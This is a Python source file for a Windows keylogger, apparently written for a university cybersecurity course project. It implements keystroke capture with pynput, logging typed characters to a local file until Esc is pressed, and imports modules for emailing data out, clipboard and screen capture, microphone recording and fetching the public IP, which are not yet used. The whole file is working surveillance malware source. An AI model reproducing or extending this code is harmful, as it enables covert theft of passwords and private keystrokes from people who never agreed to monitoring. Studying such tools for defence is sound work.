# import necessary libraries
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

import socket
import platform

import win32clipboard

from pynput.keyboard import Key, Listener

import time
import os 

from scipy.io.wavfile import write
import sounddevice as sd 

from cryptography.fernet import Fernet

import getpass
from requests import get 

from multiprocessing import Process, freeze_support
from PIL import ImageGrab


# default variables
keys_info = "key_log.txt"
file_path = "C:\\Users\\natal\\OneDrive - csulb\\Academics\\Grad School\\2. CSULB\\Courses\\4. Fall 2023\\IS 665 - Cybersec Analytics\\Group Project - Keyloger"
extend = "\\"


# create a basic 
# initialize variables
count = 0 
keys = []

def on_press(key):
    """Called when a key is pressed"""
    global keys, count

    print(key)
    keys.append(key)
    count += 1 

    if count >= 1:
        count = 0
        write_file(keys)
        keys = []

def write_file(keys):
    """Write keys to a file"""
    with open(file_path + extend + keys_info, "a") as f:
        for key in keys:
            k = str(key).replace("'", "") # convert key to str and remove single quotes
            if k.find("space") > 0: # write a new line if key is spacebar
                f.write('\n')
                f.close()
            elif k.find("Key") == -1: # filter out special keys (Ctrl, Shift, Alt, etc)
                f.write(k)
                f.close()

def on_release(key):
    """Stop keylogger if Esc is released"""
    if key == Key.esc: # if esc is entered, exit keylogger
        return False

# Listener for keyboard events
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()